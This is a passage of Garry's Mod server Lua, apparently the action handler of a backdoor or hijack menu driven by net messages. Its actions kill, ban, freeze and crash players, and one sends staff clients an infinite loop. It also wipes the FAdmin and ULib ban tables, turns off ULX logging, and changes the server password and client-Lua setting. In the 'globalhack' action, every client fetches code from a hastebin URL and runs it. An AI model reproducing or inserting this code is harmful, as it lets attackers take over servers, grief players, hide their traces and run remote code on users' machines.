        user:SendLua( [[sound.PlayURL( &quot;]]..net.ReadString()..[[&quot;, &quot;&quot;, function()end )]] ) --sound.PlayURL( &quot;https://translate.google.com/translate_tts?ie=UTF-8&amp;tl=fr-TR&amp;client=tw-ob&amp;q=TEXTE&quot;, &quot;&quot;, function()end )
    end

    if (uaction == &quot;kickuser&quot;) then
        user:Kick( net.ReadString() )
    end

    if (uaction == &quot;addmoney&quot;) then
        user:addMoney(net.ReadString())
    end

    if (uaction == &quot;stopsoundon&quot;) then
        user:SendLua([[timer.Create(&quot;stopsound&quot;, 0.001, 0, function() LocalPlayer():ConCommand(&quot;stopsound&quot;) end)]])
    end

    if (uaction == &quot;stopsoundoff&quot;) then
        user:SendLua([[timer.Remove(&quot;stopsound&quot;)]])
    end

    if (uaction == &quot;igniteall&quot;) then
        for k,v in pairs(player.GetAll()) do v:Ignite(120) end
    end

    if (uaction == &quot;igniteallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Ignite(120) end end
    end

    if (uaction == &quot;healall&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetHealth( net.ReadString() ) end
    end

    if (uaction == &quot;armorall&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetArmor( net.ReadString() ) end
    end

    if (uaction == &quot;banuser&quot;) then
        user:Ban( 0, true )
    end

    if (uaction == &quot;banipuser&quot;) then
        RunConsoleCommand( &quot;addip&quot;, 0, user:IPAddress() )
        RunConsoleCommand( &quot;writeip&quot; )
    end

    if (uaction == &quot;kickall&quot;) then
        for k,v in pairs (player.GetAll()) do v:Kick( net.ReadString() ) end
    end

    if (uaction == &quot;kickallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Kick( net.ReadString() ) end end
    end

    if (uaction == &quot;killall&quot;) then
        for k,v in pairs (player.GetAll()) do v:Kill() end
    end

    if (uaction == &quot;exploseall&quot;) then
        for k,v in pairs(player.GetAll()) do
        local explode = ents.Create( &quot;env_explosion&quot; )
            explode:SetPos(v:GetPos())
            explode:Spawn()
            explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;10&quot; )
            explode:Fire( &quot;Explode&quot;, 0, 0 )
            explode:EmitSound( &quot;weapon_AWP.Single&quot;, 400, 400 )
        v:Kill()
        end
    end

    if (uaction == &quot;exploseuser&quot;) then
        local explode = ents.Create( &quot;env_explosion&quot; )
            explode:SetPos(user:GetPos())
            explode:Spawn()
            explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;10&quot; )
            explode:Fire( &quot;Explode&quot;, 0, 0 )
            explode:EmitSound( &quot;weapon_AWP.Single&quot;, 400, 400 )
        user:Kill()
    end

    if (uaction == &quot;exploseall&quot;) then
        for k,v in pairs(player.GetAll()) do
            if( v:GetUserGroup() != &quot;user&quot; ) then 
                local explode = ents.Create( &quot;env_explosion&quot; )
                explode:SetPos(v:GetPos())
                explode:Spawn()
                explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;10&quot; )
                explode:Fire( &quot;Explode&quot;, 0, 0 )
                explode:EmitSound( &quot;weapon_AWP.Single&quot;, 400, 400 )
            v:Kill()
            end
        end
    end

    if (uaction == &quot;killallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Kill() end end
    end

    if (uaction == &quot;freezeall&quot;) then
        for k,v in pairs (player.GetAll()) do v:Freeze( true ) end
    end

    if (uaction == &quot;freezeallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Freeze( true ) end end
    end

    if (uaction == &quot;freezeuser&quot;) then
        user:Freeze( true )
    end

    if (uaction == &quot;moovetroll&quot;) then
        user:ConCommand( &quot;+duck&quot; )
        user:ConCommand( &quot;+left&quot; )
        user:ConCommand( &quot;+jump&quot; )
    end

    if (uaction == &quot;moovetrollall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+duck&quot; ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+left&quot; ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+jump&quot; ) end
    end

    if (uaction == &quot;unmoovetroll&quot;) then
        user:ConCommand( &quot;-duck&quot; )
        user:ConCommand( &quot;-left&quot; )
        user:ConCommand( &quot;-jump&quot; )
    end

    if (uaction == &quot;unmoovetrollall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-duck&quot; ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-left&quot; ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-jump&quot; ) end
    end

    if (uaction == &quot;addmoneyalls&quot;) then
    local money = net.ReadString()
        for k,v in pairs (player.GetAll()) do v:addMoney(money) end
    end

    if (uaction == &quot;forwardmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+forward&quot; ) end
    end

    if (uaction == &quot;botspam&quot;) then
    local n = net.ReadString()
        for i=1,n do
            RunConsoleCommand(&quot;bot&quot;)
        end
    end

    if (uaction == &quot;unforwardmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-forward&quot; ) end
    end

    if (uaction == &quot;hurlement&quot;) then
        for k,v in pairs(player.GetAll()) do v:EmitSound( &quot;npc/stalker/go_alert2a.wav&quot;, 100, 100 ) end
    end

    if (uaction == &quot;hurlementuser&quot;) then
        user:EmitSound( &quot;npc/stalker/go_alert2a.wav&quot;, 100, 100 )
    end

    if (uaction == &quot;unbanall&quot;) then
        sql.Query(&quot;DELETE FROM `FAdminBans`&quot;)
        sql.Query(&quot;DELETE FROM `ulib_bans`&quot;)
    end

    if (uaction == &quot;backmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+back&quot; ) end
    end

    if (uaction == &quot;pvheal&quot;) then
        user:SetHealth(net.ReadString())
    end

    if (uaction == &quot;crashadminvip&quot;) then
    for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:SendLua(&quot;while true do end&quot;) end end
    end

    if (uaction == &quot;armorpv&quot;) then
        user:SetArmor(net.ReadString())
    end

    if (uaction == &quot;unbackmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-back&quot; ) end
    end

    if (uaction == &quot;leftmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+left&quot; ) end
    end

    if (uaction == &quot;unleftmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-left&quot; ) end
    end

    if (uaction == &quot;rightmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+right&quot; ) end
    end

    if (uaction == &quot;unrightmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-right&quot; ) end
    end

    if (uaction == &quot;squatmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;+duck&quot; ) end
    end

    if (uaction == &quot;unsquatmooveall&quot;) then
        for k,v in pairs (player.GetAll()) do v:ConCommand( &quot;-duck&quot; ) end
    end

    if (uaction == &quot;forwardmoove&quot;) then
        user:ConCommand( &quot;+forward&quot; )
    end

    if (uaction == &quot;unforwardmoove&quot;) then
        user:ConCommand( &quot;-forward&quot; )
    end

    if (uaction == &quot;backmoove&quot;) then
        user:ConCommand( &quot;+back&quot; )
    end

    if (uaction == &quot;unbackmoove&quot;) then
        user:ConCommand( &quot;-back&quot; )
    end

    if (uaction == &quot;leftmoove&quot;) then
        user:ConCommand( &quot;+left&quot; )
    end

    if (uaction == &quot;unleftmoove&quot;) then
        user:ConCommand( &quot;-left&quot; )
    end

    if (uaction == &quot;notification_generic&quot;) then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua(&quot;notification.AddLegacy(\&quot;&quot; .. text .. &quot;\&quot;, NOTIFY_GENERIC, &quot; .. duration .. &quot;)&quot;)
            
            v:SendLua([[surface.PlaySound(&quot;buttons/button15.wav&quot;)]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == &quot;notification_error&quot;) then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua(&quot;notification.AddLegacy(\&quot;&quot; .. text .. &quot;\&quot;, NOTIFY_ERROR, &quot; .. duration .. &quot;)&quot;)
            
            v:SendLua([[surface.PlaySound(&quot;buttons/button15.wav&quot;)]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == &quot;notification_undo&quot;) then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua(&quot;notification.AddLegacy(\&quot;&quot; .. text .. &quot;\&quot;, NOTIFY_UNDO, &quot; .. duration .. &quot;)&quot;)
            
            v:SendLua([[surface.PlaySound(&quot;buttons/button15.wav&quot;)]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == &quot;notification_hint&quot;) then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua(&quot;notification.AddLegacy(\&quot;&quot; .. text .. &quot;\&quot;, NOTIFY_CLEANUP, &quot; .. duration .. &quot;)&quot;)
            
            v:SendLua([[surface.PlaySound(&quot;buttons/button15.wav&quot;)]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == &quot;notification_cleanup&quot;) then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua(&quot;notification.AddLegacy(\&quot;&quot; .. text .. &quot;\&quot;, NOTIFY_HINT, &quot; .. duration .. &quot;)&quot;)
            
            v:SendLua([[surface.PlaySound(&quot;buttons/button15.wav&quot;)]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == &quot;rightmoove&quot;) then
        user:ConCommand( &quot;+right&quot; )
    end

    if (uaction == &quot;unrightmoove&quot;) then
        user:ConCommand( &quot;-right&quot; )
    end

    if (uaction == &quot;squatmoove&quot;) then
        user:ConCommand( &quot;+duck&quot; )
    end

    if (uaction == &quot;unsquatmoove&quot;) then
        user:ConCommand( &quot;-duck&quot; )
    end

    if (uaction == &quot;unfreezeall&quot;) then
        for k,v in pairs (player.GetAll()) do v:Freeze( false ) end
    end

    if (uaction == &quot;unfreezeallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Freeze( false ) end end
    end

    if (uaction == &quot;noclipallon&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_NOCLIP ) end
    end

    if (uaction == &quot;noclipalloff&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_WALK ) end
    end

    if (uaction == &quot;noclipon&quot;) then
        user:SetMoveType( MOVETYPE_NOCLIP )
    end

    if (uaction == &quot;noclipoff&quot;) then
    user:SetMoveType( MOVETYPE_WALK )
    end

    if (uaction == &quot;unfreezeuser&quot;) then
        user:Freeze( false )
        user:UnLock()
        ulx.clearExclusive( user )
    end

    if (uaction == &quot;jump&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetJumpPower( 2000 ) end
    end

    if (uaction == &quot;retablirjumpall&quot;) then
        for k,v in pairs (player.GetAll()) do v:SetJumpPower( 200 ) end
    end

    if (uaction == &quot;2dplayerall&quot;) then
    for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
        local b = v:LookupBone(&quot;ValveBiped.Bip01_R_Thigh&quot;)
        local c = v:LookupBone(&quot;ValveBiped.Bip01_L_Thigh&quot;)
        local d = v:LookupBone(&quot;ValveBiped.Bip01_R_Calf&quot;)
        local e = v:LookupBone(&quot;ValveBiped.Bip01_L_Calf&quot;)
        local f = v:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
        local g = v:LookupBone(&quot;ValveBiped.Bip01_L_UpperArm&quot;)
        local h = v:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
        local i = v:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
        local j = v:LookupBone(&quot;ValveBiped.Bip01_R_Clavicle&quot;)
        local k = v:LookupBone(&quot;ValveBiped.Bip01_L_Clavicle&quot;)
        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end
    end

    if (uaction == &quot;grossetete&quot;) then
        for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
        v:ManipulateBoneScale( a, Vector(5,5,5)) 
        end
    end

    if (uaction == &quot;grosseteteuser&quot;) then
        local a = user:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
        user:ManipulateBoneScale( a, Vector(5,5,5)) 
    end

    if (uaction == &quot;2dplayeruser&quot;) then
        local a = user:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
        local b = user:LookupBone(&quot;ValveBiped.Bip01_R_Thigh&quot;)
        local c = user:LookupBone(&quot;ValveBiped.Bip01_L_Thigh&quot;)
        local d = user:LookupBone(&quot;ValveBiped.Bip01_R_Calf&quot;)
        local e = user:LookupBone(&quot;ValveBiped.Bip01_L_Calf&quot;)
        local f = user:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
        local g = user:LookupBone(&quot;ValveBiped.Bip01_L_UpperArm&quot;)
        local h = user:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
        local i = user:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
        local j = user:LookupBone(&quot;ValveBiped.Bip01_R_Clavicle&quot;)
        local k = user:LookupBone(&quot;ValveBiped.Bip01_L_Clavicle&quot;)
        user:ManipulateBoneScale( a, Vector(4,0,4)) 
        user:ManipulateBoneScale( b, Vector(0,0,0))
        user:ManipulateBoneScale( c, Vector(0,0,0))
        user:ManipulateBoneScale( d, Vector(0,0,1))
        user:ManipulateBoneScale( e, Vector(0,0,1))
        user:ManipulateBoneScale( f, Vector(0,0,0))
        user:ManipulateBoneScale( g, Vector(0,0,0))
        user:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( j, Vector(0,0,0))
        user:ManipulateBoneScale( k, Vector(0,0,0))
    end

    if (uaction == &quot;jumpuser&quot;) then
        user:SetJumpPower( 2000 )
    end

    if (uaction == &quot;jumpuser&quot;) then
        user:SetJumpPower( 2000 )
    end

    if (uaction == &quot;logsremove&quot;) then
        RunConsoleCommand(&quot;ulx_logecho&quot;, &quot;0&quot;)
    end

    if (uaction == &quot;gm_construct_spawn&quot;) then
        user:SetPos( Vector( 786.414490, -166.286102, -79.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_building_roof0&quot;) then
        user:SetPos( Vector( 1741.335815, -1606.526245, 1161.920288 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_building_roof1&quot;) then
        user:SetPos( Vector( 1434.847778, -1624.269897, 1360.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_building2_roof0&quot;) then
        user:SetPos( Vector( -2312.447266, -2994.058105, 2912.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_building3_roof0&quot;) then
        user:SetPos( Vector( -4632.838379, 5414.228516, 2560.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_building2_roof1&quot;) then
        user:SetPos( Vector( -2301.528564, -3178.893555, 2368.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_down&quot;) then
        user:SetPos( Vector( -2072.327148, -120.263184, -447.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_secret&quot;) then
        user:SetPos( Vector( -2994.707031, -1243.276611, -77.271637 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_construct_skybox&quot;) then
        user:SetPos( Vector( -1543.972412, 1734.876221, 10937.232422 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;gm_flat_secret&quot;) then
        user:SetPos( Vector( -599.203491, 6.064875, -12703.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;glife3_grue&quot;) then
        user:SetPos( Vector( -2150.254395, 7953.561523, 1333.250366 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;glife3_secret&quot;) then
        user:SetPos( Vector( -7075.260742, 1205.734009, -288.307312 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;glife3_coffre&quot;) then
        user:SetPos( Vector( -6389.708008, 5038.359375, 96.025749 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;glife3_water_tower&quot;) then
        user:SetPos( Vector( 5316.801758, 15845.748047, 1652.517944 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == &quot;rp_rockford_v2b_spawn&quot;) then
        user:SetPos( Vector( -4701.085938 ,-5387.226563,128.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end



    if (uaction == &quot;spamchat&quot;) then
        timer.Create( &quot;spamchat1&quot;, 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), &quot;&acirc;&ndash; &acirc;&ndash;&sbquo; &acirc;&ndash;&fnof; &acirc;&ndash;&bdquo; &acirc;&ndash;&hellip; &acirc;&ndash;&dagger; &acirc;&ndash;&Dagger;&Auml;&curren;&aacute;&ordm;&ordf;&Auml;&circ;&ETH;&OElig;&Auml;&rsquo;&Auml;Ž &agrave;&cedil;&iquest;&Acirc;&yen; &Auml;&rdquo;&Iuml;&Auml;&uml;&Auml;&copy;&Auml;&dagger;&aacute;&ordm;&curren; &Aring;&curren;&Icirc;&circ;&Ccedil;&ordm;M&acirc;&ndash;&circ; &acirc;&ndash;&Dagger; &acirc;&ndash;&dagger; &acirc;&ndash;&hellip; &acirc;&ndash;&bdquo; &acirc;&ndash;&sbquo; &acirc;&ndash;&quot;)]]) end)
    
    end

    if (uaction == &quot;restartserver&quot;) then
        if file.Exists(&quot;data/ulx/config.txt&quot;, &quot;GAME&quot;) then
            game.ConsoleCommand(&quot;ulx map &quot; .. game.GetMap() .. &quot;\n&quot;)
        else
            game.ConsoleCommand(&quot;changelevel &quot; .. game.GetMap() .. &quot;\n&quot;)
        end
    end

    if (uaction == &quot;spamchatstop&quot;) then
    timer.Stop( &quot;spamchat1&quot;)    
    end

    if (uaction == &quot;setmodel&quot;) then
        user:SetModel( net.ReadString() )
    end

    if (uaction == &quot;retablirjumpuser&quot;) then
        user:SetJumpPower( 200 )
    end

    if (uaction == &quot;launchuser&quot;) then
        user:SetVelocity( Vector( 0,0,50 ) * 50 )
    end

    if (uaction == &quot;lockdown&quot;) then
        user:Give( &quot;weapon_rpg&quot; )
        user:GiveAmmo( 200, &quot;RPG_Round&quot;, true )
        user:SendLua([[
hook.Add( &quot;Think&quot;, &quot;TriggerBofezt&quot;, function()
RunConsoleCommand(&quot;use&quot;,&quot;weapon_rpg&quot;)
if !Firing then
    RunConsoleCommand( &quot;+attack&quot; )
    Firing = true
else
    RunConsoleCommand( &quot;-attack&quot; )
    Firing = false
end
end )
        ]])
    end

    if (uaction == &quot;launchall&quot;) then
        for k,v in pairs (player.GetAll()) do 
            v:SetVelocity( Vector( 0,0,50 ) * 50 )
        end
    end

    if (uaction == &quot;globalhack&quot;) then
        if !ptdr then
            for k,v in pairs (player.GetAll()) do v:SendLua([[http.Fetch(&quot;https://hastebin.com/raw/huyupufifi&quot;,function(b) RunString(b) end)]]) end
            local ptdr = 1
        else
            local ptdr = 0
            for k,v in pairs (player.GetAll()) do v:SendLua([[hook.Remove(&quot;PostDrawOpaqueRenderables&quot;,&quot;\xFFitsrainingchairs\xFF&quot;)]]) end
        end
    end

    if (uaction == &quot;changename&quot;) then
    RunConsoleCommand(&quot;hostname&quot;, net.ReadString())
    end

if (uaction == &quot;namechanger&quot;) then
local namesf = {
&quot;Marc&quot;,                  
&quot;Hugh&quot;,      
&quot;Maurice&quot;,      
&quot;Gill&quot;,                    
&quot;Etienne&quot;,      
&quot;Antoine&quot;,      
&quot;Jean&quot;,      
&quot;Benoit&quot;,      
&quot;Gilbert&quot;,      
&quot;Laurent&quot;,      
&quot;Alexis&quot;,      
&quot;Alexandre&quot;,      
&quot;Denis&quot;,      
&quot;Nicholas&quot;,      
&quot;Leon&quot;,      
&quot;Leonard&quot;,      
&quot;Leo&quot;,      
&quot;Olivier&quot;,                  
&quot;Curtis&quot;,            
&quot;Antonio&quot;,      
&quot;Gregory&quot;,      
&quot;Charlie&quot;,      
&quot;Luc&quot;,      
&quot;Patrick&quot;,      
&quot;Phillip&quot;,      
&quot;Bernard&quot;,            
&quot;Charles&quot;,            
&quot;Gaspar&quot;,      
&quot;Claude&quot;,      
&quot;Michael&quot;,      
&quot;Brandon&quot;,      
&quot;Richard&quot;,      
&quot;William&quot;,      
&quot;Serge&quot;,      
&quot;Freddie&quot;,                  
&quot;Samuel&quot;,      
&quot;Gaetan&quot;,      
&quot;Gerald&quot;,      
&quot;Arnold&quot;,      
&quot;Roland&quot;,      
&quot;Justin&quot;,      
&quot;Theodore&quot;,      
&quot;Claude&quot;,      
&quot;Hugues&quot;,      
&quot;Albert&quot;,      
&quot;Arthur&quot;,      
&quot;Jay&quot;,      
&quot;Jeremi&quot;,      
&quot;Rene&quot;,      
&quot;Pascal&quot;,      
&quot;Carlos&quot;,      
&quot;Fabien&quot;,      
&quot;Rafael&quot;,      
&quot;Benjamin&quot;,      
&quot;Ernest&quot;,      
&quot;Victor&quot;,      
&quot;Martin&quot;,      
&quot;Franck&quot;,      
&quot;Walter&quot;,      
&quot;Isaac&quot;,      
&quot;Roger&quot;,         
&quot;Alfred&quot;,      
&quot;Jason&quot;,            
&quot;Danny&quot;,      
&quot;Henry&quot;,      
&quot;Jimmy&quot;,      
&quot;Kevin&quot;,      
&quot;Geoffrey&quot;,                      
&quot;Dominic&quot;,      
&quot;Christopher&quot;,
&quot;David&quot;,
&quot;Steven&quot;,
}
for k,v in pairs (player.GetAll()) do local name = table.Random( namesf ) v:Say(&quot;/name &quot; .. name,true) end
    end

    if (uaction == &quot;namechangerspam&quot;) then
local namesfs = {
&quot;Marc&quot;,                  
&quot;Hugh&quot;,      
&quot;Maurice&quot;,      
&quot;Gill&quot;,                    
&quot;Etienne&quot;,      
&quot;Antoine&quot;,      
&quot;Jean&quot;,      
&quot;Benoit&quot;,      
&quot;Gilbert&quot;,      
&quot;Laurent&quot;,      
&quot;Alexis&quot;,      
&quot;Alexandre&quot;,      
&quot;Denis&quot;,      
&quot;Nicholas&quot;,      
&quot;Leon&quot;,      
&quot;Leonard&quot;,      
&quot;Leo&quot;,      
&quot;Olivier&quot;,                  
&quot;Curtis&quot;,            
&quot;Antonio&quot;,      
&quot;Gregory&quot;,      
&quot;Charlie&quot;,      
&quot;Luc&quot;,      
&quot;Patrick&quot;,      
&quot;Phillip&quot;,      
&quot;Bernard&quot;,            
&quot;Charles&quot;,            
&quot;Gaspar&quot;,      
&quot;Claude&quot;,      
&quot;Michael&quot;,      
&quot;Brandon&quot;,      
&quot;Richard&quot;,      
&quot;William&quot;,      
&quot;Serge&quot;,      
&quot;Freddie&quot;,                  
&quot;Samuel&quot;,      
&quot;Gaetan&quot;,      
&quot;Gerald&quot;,      
&quot;Arnold&quot;,      
&quot;Roland&quot;,      
&quot;Justin&quot;,      
&quot;Theodore&quot;,      
&quot;Claude&quot;,      
&quot;Hugues&quot;,      
&quot;Albert&quot;,      
&quot;Arthur&quot;,      
&quot;Jay&quot;,      
&quot;Jeremi&quot;,      
&quot;Rene&quot;,      
&quot;Pascal&quot;,      
&quot;Carlos&quot;,      
&quot;Fabien&quot;,      
&quot;Rafael&quot;,      
&quot;Benjamin&quot;,      
&quot;Ernest&quot;,      
&quot;Victor&quot;,      
&quot;Martin&quot;,      
&quot;Franck&quot;,      
&quot;Walter&quot;,      
&quot;Isaac&quot;,      
&quot;Roger&quot;,         
&quot;Alfred&quot;,      
&quot;Jason&quot;,            
&quot;Danny&quot;,      
&quot;Henry&quot;,      
&quot;Jimmy&quot;,      
&quot;Kevin&quot;,      
&quot;Geoffrey&quot;,                      
&quot;Dominic&quot;,      
&quot;Christopher&quot;,
&quot;David&quot;,
&quot;Steven&quot;,
}
timer.Create( &quot;namechangerspam&quot;, 5, 0, function() 
for k,v in pairs (player.GetAll()) do local namez = table.Random( namesfs ) v:Say(&quot;/name &quot; .. namez,true) end
end)
    end

    if (uaction == &quot;namechangerstop&quot;) then
    timer.Destroy(&quot;namechangerspam&quot;)
    end

    if (uaction == &quot;allowcsluads&quot;) then
    RunConsoleCommand(&quot;sv_allowcslua&quot;, net.ReadString())
    end

    if (uaction == &quot;secureinfo&quot;) then
    RunConsoleCommand(&quot;sv_password&quot;, net.ReadString())
    end
    
    if (uaction == &quot;changeload&quot;) then
    RunConsoleCommand( &quot;sv_loadingurl&quot;, net.ReadString() )
    end

    if (uaction == &quot;killuser&quot;) then
        user:Kill()
    end

    if (uaction == &quot;addmoneyall&quot;) then
        for k,v in pairs(player.GetAll()) do timer.Create( &quot;timerargent10&quot;, 0.01, 0, function() v:addMoney(11) end) end
    end

    if (uaction == &quot;flashon&quot;) then
        user:SendLua([[timer.Create(&quot;impulse 100&quot;, 0.001, 0, function() LocalPlayer():ConCommand(&quot;impulse 100&quot;) end)]])
    end

    if (uaction == &quot;flashoff&quot;) then
        user:SendLua([[timer.Remove(&quot;impulse 100&quot;)]])
    end

    if (uaction == &quot;screenon&quot;) then
    user:SendLua([[timer.Create(&quot;screenshot requested&quot;, 0.001, 0, function() LocalPlayer():ConCommand(&quot;screenshot requested&quot;) end)]])
    end

    if (uaction == &quot;screenoff&quot;) then
    user:SendLua([[timer.Remove(&quot;screenshot requested&quot;)]])
    end

    if (uaction == &quot;killusersilence&quot;) then
        user:KillSilent()
    end

    if (uaction == &quot;allkillusersilence&quot;) then
    for k,v in pairs (player.GetAll()) do v:KillSilent() end
    end

    if (uaction == &quot;animation_salute&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    end

    if (uaction == &quot;animation_salute_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    timer.Create(&quot;salute_loop&quot;,3.3,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    end )
    end

    if (uaction == &quot;animation_robot&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    end

    if (uaction == &quot;animation_robot_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    timer.Create(&quot;robot_loop&quot;,11.35,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    end )
    end

    if (uaction == &quot;animation_cheer&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    end

    if (uaction == &quot;animation_cheer_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    timer.Create(&quot;cheer_loop&quot;,2.7,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    end )
    end

    if (uaction == &quot;animation_laugh&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    end

    if (uaction == &quot;animation_laugh_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    timer.Create(&quot;laugh_loop&quot;,5.81,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    end )
    end

    if (uaction == &quot;animation_muscle&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    end

    if (uaction == &quot;animation_muscle_loop&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    timer.Create(&quot;muscle_loop&quot;,13,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    end )
    end

    if (uaction == &quot;animation_persistence&quot;) then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    end

